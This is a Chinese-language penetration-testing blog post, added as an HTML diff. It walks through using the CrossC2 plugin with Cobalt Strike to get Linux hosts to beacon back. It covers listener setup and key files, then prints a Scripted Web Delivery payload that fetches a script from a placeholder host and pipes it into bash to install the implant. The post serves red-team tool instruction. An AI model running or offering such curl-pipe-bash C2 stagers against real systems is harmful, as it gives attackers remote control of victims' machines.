@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>CS上线Linux - T0x1c</title>
+
+  
+    <meta name="description" content="如果平时在渗透时想要上线类 Linux 系统，需要借助 Cross C2。它是一个支持 Linux &amp; MacOS 系统的拓展插件，支持用户自定义生成的动态库，以无文件落地的方式从内存中加载执行动态库或可执行文件。相当于一个小集群，在 CS 中插件化方便利用，在实际的渗透中可以帮助我们通过无文件落地的方式使用命令行进行渗透。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS上线Linux">
+<meta property="og:url" content="https://toxic80l.github.io/post/ce1ea042/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="如果平时在渗透时想要上线类 Linux 系统，需要借助 Cross C2。它是一个支持 Linux &amp; MacOS 系统的拓展插件，支持用户自定义生成的动态库，以无文件落地的方式从内存中加载执行动态库或可执行文件。相当于一个小集群，在 CS 中插件化方便利用，在实际的渗透中可以帮助我们通过无文件落地的方式使用命令行进行渗透。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.30.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.35.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.39.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.41.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.47.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.48.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.52.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.52.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.53.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.04.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.04.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.40.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.15.34.png">
+<meta property="article:published_time" content="2021-12-23T19:24:13.000Z">
+<meta property="article:modified_time" content="2021-12-24T01:26:33.236Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="CrossC2">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.30.09.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-text">0x01 前期准备</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E7%89%88%E6%9C%AC"><span class="toc-text">CS版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E9%9C%80%E6%96%87%E4%BB%B6"><span class="toc-text">所需文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E9%85%8D%E7%BD%AE"><span class="toc-text">前期配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%85%8D%E5%90%88CS%E5%B9%B6%E4%B8%8A%E7%BA%BFLinux"><span class="toc-text">0x02 配合CS并上线Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BDCross-C2%E8%84%9A%E6%9C%AC"><span class="toc-text">加载Cross C2脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-text">配置监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90payload%E5%B9%B6%E4%B8%8A%E7%BA%BF"><span class="toc-text">生成payload并上线</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B7%A5%E5%85%B7%E6%8A%80%E5%B7%A7/">工具技巧</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2021-12-23T19:24:13.000Z">2021-12-24</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>CS上线Linux</span></h1>
+<p>如果平时在渗透时想要上线类 Linux 系统，需要借助 Cross C2。它是一个支持 Linux &amp; MacOS 系统的拓展插件，支持用户自定义生成的动态库，以无文件落地的方式从内存中加载执行动态库或可执行文件。相当于一个小集群，在 CS 中插件化方便利用，在实际的渗透中可以帮助我们通过无文件落地的方式使用命令行进行渗透。<span id="more"></span></p>
+<h2 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h2><h3 id="CS版本"><a href="#CS版本" class="headerlink" title="CS版本"></a>CS版本</h3><p>当前 CS 使用版本为<code>CS 4.3</code>，其他版本还未进行测试</p>
+<h3 id="所需文件"><a href="#所需文件" class="headerlink" title="所需文件"></a>所需文件</h3><p>我们需要准备以下几个文件，都是 CrossC2 中拷贝下来的，其中 CrossC2Kit.zip 是 CrossC2Kit 压缩所得。</p>
+<p><strong>下载地址：<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></strong></p>
+<ul>
+<li>genCrossC2.MacOS</li>
+<li>CrossC2.cna</li>
+<li>CrossC2Kit.zip</li>
+</ul>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.30.09.png" alt="截屏2021-12-07 下午10.30.09"></p>
+<h3 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h3><p>该文件夹位置为<code>/Users/xxx/Desktop/Tools/CobaltStrike/Plugins/CrossC2-MacOS/</code>，接下来编辑 CrossC2.cna 设置 <code>$CC2_PATH</code>和<code>$CC2_BIN</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.35.51.png" alt="截屏2021-12-07 下午10.35.51"><br>为了防止木马无法生成，需要为 genCrossC2.MacOS 添加执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x genCrossC2.MacOS</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-配合CS并上线Linux"><a href="#0x02-配合CS并上线Linux" class="headerlink" title="0x02 配合CS并上线Linux"></a>0x02 配合CS并上线Linux</h2><h3 id="加载Cross-C2脚本"><a href="#加载Cross-C2脚本" class="headerlink" title="加载Cross C2脚本"></a>加载Cross C2脚本</h3><p>连接CS，打开脚本管理器，加载CrossC2.cna<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.39.04.png" alt="截屏2021-12-07 下午10.39.04"></p>
+<h3 id="配置监听器"><a href="#配置监听器" class="headerlink" title="配置监听器"></a>配置监听器</h3><p>加载成功后上方会出现 CrossC2 ，接下来新建监听器并选择 https beacon，目前C2只支持https来监听<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.41.01.png" alt="截屏2021-12-07 下午10.41.01"><br>在 CrossC2 中选择点击 Create CrossC2 Listener 创建https监听<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.47.42.png" alt="截屏2021-12-07 下午10.47.42"><br>其中 .cobaltstrike.beacon_keys 是从CS服务端拷贝下来的，将其放置CS客户端的目录中，而后将 Listener 设置为以上设置的监听器，最后点击生成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.48.41.png" alt="截屏2021-12-07 下午10.48.41"><br>点击生成，出现如下界面说明监听成功开启<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.52.12.png" alt="截屏2021-12-07 下午10.52.12"></p>
+<h3 id="生成payload并上线"><a href="#生成payload并上线" class="headerlink" title="生成payload并上线"></a>生成payload并上线</h3><p>在 CrossC2 中选择 Scripted Web Delivery<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.52.48.png" alt="截屏2021-12-07 下午10.52.48"><br>选择为刚刚生成的监听器，其他默认点击生成即可<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8810.53.37.png" alt="截屏2021-12-07 下午10.53.37"><br>获得如下payload，放入kali中进行运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A O -o- -L http://x.x.x.x:55413/a | bash -s</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.04.44.png" alt="截屏2021-12-07 下午11.04.44"><br>成功上线 Cobalt Strike<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.04.22.png" alt="截屏2021-12-07 下午11.04.22"><br>开始会话交互，能够正常执行命令，与目标进行交互<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.40.06.png" alt="截屏2021-12-07 下午11.40.06"><br>查看文件系统<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ce1ea042/%E6%88%AA%E5%B1%8F2021-12-07%20%E4%B8%8B%E5%8D%8811.15.34.png" alt="截屏2021-12-07 下午11.15.34"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/3e37f523/">HTB: Arkham<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/a670552e/">针对域名的信息收集<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
